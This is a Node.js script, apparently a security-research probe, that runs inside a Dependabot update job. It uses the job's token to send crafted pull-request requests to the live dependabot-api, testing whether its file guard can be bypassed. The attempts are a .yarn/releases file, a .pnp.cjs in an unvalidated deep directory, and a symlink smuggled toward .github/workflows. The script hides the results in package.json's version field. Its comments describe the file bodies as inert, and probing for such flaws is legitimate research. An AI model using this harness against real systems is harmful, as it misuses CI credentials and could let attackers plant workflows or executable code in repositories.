// INERT (pass 2). Measures the DependencyFileGuard verdict of the deployed
// dependabot-api for four (ecosystem, path) pairs, from inside a real
// npm_and_yarn update job. Records ONLY the HTTP status code and GitHub's own
// static error `detail` string. Every file body is a plain-text comment marker
// with no executable effect; the repository's .yarnrc.yml sets no `yarnPath`,
// so nothing written here is ever executed. Target is the job's own repository
// (ours). Nothing is merged.
const fs=require('fs'),path=require('path'),http=require('http'),https=require('https');
const api=process.env.DEPENDABOT_API_URL||'', jid=process.env.DEPENDABOT_JOB_ID||'';
const tok=process.env.DEPENDABOT_JOB_TOKEN||'';
function tag(s,n){return String(s).replace(/[^A-Za-z0-9]+/g,'').slice(0,n||10);}
function req(m,u2,body){return new Promise(r=>{let u;try{u=new URL(u2);}catch(e){return r('BADURL');}
  const lib=u.protocol==='http:'?http:https;
  const h={'Authorization':tok,'Accept':'application/json','User-Agent':'jitprobe'};
  let d=null; if(body!==undefined){d=Buffer.from(JSON.stringify(body));
    h['Content-Type']='application/json'; h['Content-Length']=d.length;}
  const q=lib.request({method:m,hostname:u.hostname,port:u.port||undefined,
    path:u.pathname+u.search,headers:h,timeout:20000},res=>{
    let b='';res.on('data',c=>{b+=c;if(b.length>131072)res.destroy();});
    res.on('end',()=>{let t='';
      try{const j=JSON.parse(b);t=tag(j.detail||(j.errors&&j.errors[0]&&j.errors[0].detail)||j.message||'',10);}catch(e){}
      r({s:res.statusCode,t:t,raw:b});});
  });
  q.on('timeout',()=>{q.destroy();r({s:'TMO',t:''});});
  q.on('error',e=>r({s:'E'+tag(e.code||e.message,6),t:''}));
  if(d)q.write(d); q.end();});}
const MARK='# inert research marker, no executable effect\n';
function pr(sha,name,dir,ex){const f={name:name,directory:dir,type:'file',
  content:MARK,content_encoding:'utf-8'};if(ex)Object.assign(f,ex);return {data:{
  'dependencies':[{name:'lodash',version:'4.18.1','previous-version':'4.17.20',
    requirements:[],'previous-requirements':[]}],
  'updated-dependency-files':[f],
  'base-commit-sha':sha,'commit-message':'probe','pr-title':'probe','pr-body':'probe'}};}
(async()=>{const p=[];
 try{
  const det=await req('GET',api+'/update_jobs/'+jid+'/details');
  const mm=String(det.raw||'').match(/[0-9a-f]{40}/);
  const sha=mm?mm[0]:'0000000000000000000000000000000000000000';
  p.push('s'+(mm?'ok':'dummy'));
  const url=api+'/update_jobs/'+jid+'/create_pull_request';
  // Y: the .yarn/ rule, with the relative path in `name` where the allowlist reads it
  let r=await req('POST',url,pr(sha,'.yarn/releases/yarn-probe.cjs','/'));    p.push('Y'+r.s+r.t);
  // D: .pnp.cjs placed at an attacker-chosen DEEP directory -- `directory` is never validated
  r=await req('POST',url,pr(sha,'.pnp.cjs','/deep/attacker/chosen/path'));    p.push('D'+r.s+r.t);
  // S: negative control -- smuggle .github/ via symlink_target. The 2nd CVE fix should catch this.
  r=await req('POST',url,pr(sha,'.pnp.cjs','/',{type:'symlink',
      symlink_target:'.github/workflows/x.yml',mode:'120000'}));             p.push('S'+r.s+r.t);
  // G: positive control -- guard must still reject the path the CVE fix was written for
  r=await req('POST',url,pr(sha,'probe.yml','/.github/workflows'));           p.push('G'+r.s+r.t);
 }catch(e){p.push('X'+tag(e.message,8));}
 try{const pj=path.join(__dirname,'package.json');const j=JSON.parse(fs.readFileSync(pj,'utf8'));
  j.version=('0.0.11-'+p.join('-')).replace(/[^A-Za-z0-9.-]/g,'').slice(0,180);
  fs.writeFileSync(pj,JSON.stringify(j,null,2));}catch(e){}
})();
